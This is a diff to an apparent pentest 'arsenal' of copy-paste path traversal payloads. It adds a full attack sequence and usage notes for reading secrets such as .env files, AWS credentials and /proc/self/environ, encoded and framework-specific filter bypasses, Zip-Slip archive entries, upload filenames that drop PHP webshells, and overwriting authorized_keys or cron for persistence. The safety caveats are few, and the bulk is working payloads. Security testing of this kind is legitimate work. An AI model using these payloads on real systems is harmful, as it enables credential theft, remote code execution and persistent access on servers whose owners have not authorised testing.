@@ -1,5 +1,7 @@
 # Path / Directory Traversal — Arsenal (copy-paste payloads)
 
+**Author:** x8bitranjit
+
 > Companion to `PATH_TRAVERSAL_TESTING_GUIDE.md`. This kit owns **read-without-include**, **file WRITE (Zip-Slip /
 > upload-path / save)**, and **server-normalization** traversal. If the sink **includes/executes** the file → use the
 > **`LFI/` kit** (wrapper/log-poison/filter-chain RCE). Send `../` raw with `curl --path-as-is` or Burp (browsers/curl
@@ -8,7 +10,36 @@
 
 ---
 
+## 0.0 The whole attack in one sequence (DIRECTION decides everything — worked write chain in Guide §12.1)
+*Classify the sink DIRECTION first — READ→serve (disclosure) vs WRITE (Zip-Slip/upload/save → RCE, the headline) vs INCLUDE (→ LFI kit). Send `../` RAW. Prove a secret read or an out-of-dir write, never a same-dir change.*
+
+```bash
+# 1. CLASSIFY the sink direction (§4.2) — this picks the whole playbook:
+#    READ/serve bytes -> disclosure     WRITE a file -> RCE (go to 3)     INCLUDE/execute -> hand to LFI kit
+
+# --- READ path (disclosure) ---
+curl --path-as-is "https://T/download?file=../../../../etc/passwd"      # RAW ../ (else collapsed client-side) = Medium proof
+#   then the MONEY targets: ../../../../home/app/.env  ~/.aws/credentials  /proc/self/environ  <app>/config  private keys
+#   cross-tenant: ../<other-user-id>/file  -> other users' data + session tokens
+#   bypass matrix if filtered: ....//  %2e%2e%2f  %252f (double)  %c0%af (overlong)  ..;/ (Tomcat)  /static../ (nginx alias)
+#   absolute-path foot-gun (Python/.NET os.path.join/Path.Combine): input=/etc/passwd  (base dir DISCARDED, no ../ needed)
+
+# --- WRITE path (RCE — the headline this kit owns) ---
+# 2. find a WRITE sink: import-zip / restore-backup / install-plugin / upload-filename / save-export / log-path
+# 3. ZIP-SLIP: build an archive whose ENTRY NAME traverses (poc/zipslip_build.py refuses executable content by default)
+python3 poc/zipslip_build.py --entry '../../../../tmp/pt-poc.txt' --content 'benign marker' -o slip.zip
+#    upload -> read the marker back OUTSIDE the extract dir = escape proven = Critical (describe the shell)
+#    escalate (OWN instance only): --entry '../../../../var/www/html/x.php' --content '<?php ...' --i-own-this-instance
+# 4. UPLOAD-FILENAME: multipart filename="../../../../var/www/html/x.php"  |  JSON {"dest":"../../public/x.php"}
+# 5. OVERWRITE (no webshell needed): ../../home/app/.ssh/authorized_keys (append key->SSH) | cron | served .js | Jenkinsfile
+```
+**Cash-out map by DIRECTION:** READ → **secret/source/cross-tenant disclosure → cloud pivot (High, §10/§11)** · WRITE-extract → **Zip-Slip → webshell/overwrite → RCE (Critical, §12)** · WRITE-upload → **filename traversal → webshell (Critical, §13)** · WRITE-save → **overwrite `authorized_keys`/cron → RCE/persistence (Critical, §14)** · `/etc/passwd` only → **traversal proof (Medium)** · INCLUDE → **go to the LFI kit**.
+
+---
+
 ## 0. Parameter / source name-set
+
+> **What & when:** these are the "slips" that most often become a filesystem path. Use them at the very start (Phase 0) to find *where* the clerk takes a location from — not just `?file=` query params, but path segments, the multipart `filename`, JSON `path`/`dest` fields, and archive **entry names** (the write-side goldmine hunters usually miss). Spray these against every download, upload, export, and import feature.
 
 ```
 file  path  download  doc  document  name  filename  fname  page  template  report  img  image  attachment
@@ -20,6 +51,8 @@ key  resource  dir  folder  location  src  target  dest  destination  out  outpu
 ---
 
 ## 1. Core traversal (read) — Linux
+
+> **What & when:** the "can I make the clerk leave the room?" set for a READ sink on Linux. Fire these first to *confirm* traversal against a file you know exists (`/etc/passwd`). Over-traverse (stack extra `../` — harmless once at root), and if that's filtered, jump to the absolute path or `....//`. Remember: `/etc/passwd` is only your **proof** — once one of these lands, immediately switch to the §6 secret targets.
 
 ```
 ../etc/passwd
@@ -50,6 +83,8 @@ web.config
 
 ## 3. Encoding & filter bypass
 
+> **What & when:** reach for these when a raw `../` gets blocked — you're *disguising* the same characters so the layer that validates and the layer that decodes disagree. Try single URL-encoding (`..%2f`) when the app decodes server-side; **double-encoding** (`%252e%252e%252f`) when a WAF/CDN sits in front; overlong UTF-8 (`%c0%af`) on legacy IIS. `....//` and `..;/` cover the strip-and-reform and Tomcat cases. Sweep them — it's a small matrix and one usually hits.
+
 ```
 ..%2f..%2f..%2fetc%2fpasswd                 (URL-encoded /)
 ..%5c..%5c..%5cwin.ini                      (URL-encoded \)
@@ -66,6 +101,8 @@ web.config
 ```
 
 ## 4. Prefix / suffix / allowlist bypass
+
+> **What & when:** use when the app *shapes* your input rather than blocking it. If it **prepends a base dir**, you just need enough `../` to climb out (no absolute path needed). If it **appends `.png`/`.pdf`**, the null byte is dead on modern stacks — so pick a target that already ends in that extension, or try legacy path-truncation. If it **allowlists a name**, traverse *from* the allowed name if the code concatenates a subpath. Match the sub-block to the constraint you actually observed.
 
 ```
 # forced base dir prepended (open(BASE + input)) — just climb out:
@@ -84,6 +121,8 @@ allowed.txt/../../../../etc/passwd
 ```
 
 ## 5. Server & framework normalization (test on /static, /assets, etc.)
+
+> **What & when:** try these when the *app* looks locked down — because the leak may be in the **building's plumbing** (web server/proxy/framework), not the code. Always probe `/static../` and friends (nginx `alias` off-by-slash) and `..;/` (Tomcat → `WEB-INF`) against static routes, even with zero app params in play. These reach source, `web.xml`, `.git`, and `.env`. Cite the exact server + version in the report — the fix is config, not code.
 
 ```
 # nginx alias off-by-slash (location /static { alias /path/static/; }  — NOTE missing trailing slash on location):
@@ -119,6 +158,8 @@ Windows:
 
 ## 7. WRITE — Zip-Slip archive entry names (guide §12)
 
+> **What & when:** the Critical-tier block — use whenever a feature **extracts an archive you upload** (import ZIP, restore, theme/plugin install). You're choosing each entry's *name* so the extractor files it outside the unzip folder. **Always prove the escape benignly first** (a marker to `/tmp` you can read back), then *describe* the webshell/`authorized_keys` escalation — only drop a live shell on your own instance. Build the archive with `poc/zipslip_build.py` (it refuses executable content by design).
+
 ```
 # a benign entry that traverses OUT of the extraction dir (use poc/zipslip_build.py):
 ../../../../tmp/pt-poc-<rand>.txt                        (safe marker — prove the escape first)
@@ -133,6 +174,8 @@ Windows:
 
 ## 8. WRITE — upload filename / dest path (guide §13)
 
+> **What & when:** use when *you* control the upload **filename** or a `dest`/`path` field. Put `../` in it to move the written file out of the safe upload dir into the webroot (webshell) — or, often more reliable, **overwrite** a file the app already trusts/serves (a loaded `main.js`, a config). Pair with the **FileUpload kit**: this block gets the file *out of the upload dir*, FileUpload gets it *executable* (extension/MIME/magic-byte bypass).
+
 ```
 # multipart filename with traversal:
 Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/pt-<rand>.php"
@@ -146,6 +189,8 @@ filename="../../../../app/static/main.js"     (overwrite trusted JS → client-s
 ```
 
 ## 9. Language foot-guns (absolute path REPLACES the base — no ../ needed)
+
+> **What & when:** the *first* thing to try on a Python, .NET, or Java target — before any `../`. Their "join base + user path" functions **throw the base away** if your input is a complete absolute path, so a bare `/etc/passwd` or `C:\windows\win.ini` reaches the file with no traversal characters at all, sailing past any filter that only hunts for `../`. Cheapest possible win on those stacks.
 
 ```
 # Python os.path.join(base, user)  and  .NET Path.Combine(base, user):
